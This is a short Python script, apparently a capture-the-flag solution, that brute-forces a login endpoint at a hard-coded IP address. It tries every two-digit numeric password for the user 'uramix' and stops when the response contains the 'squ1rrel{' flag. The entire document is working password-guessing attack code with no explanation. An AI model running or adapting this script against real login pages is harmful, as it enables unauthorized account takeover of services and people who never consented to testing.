import requests

url="http://52.188.82.43:8060/login"
NUMBERS = '0123456789'

combinations = []

for i in NUMBERS:
    for j in NUMBERS:
        combinations.append(i + j)

for combination in combinations:
    r=requests.post(url,data={"username":"uramix","password":f"{combination}"})
    if "squ1rrel{" in r.text:
        print(r.text)
        exit()
    else:
        print(f"{combination} is not right")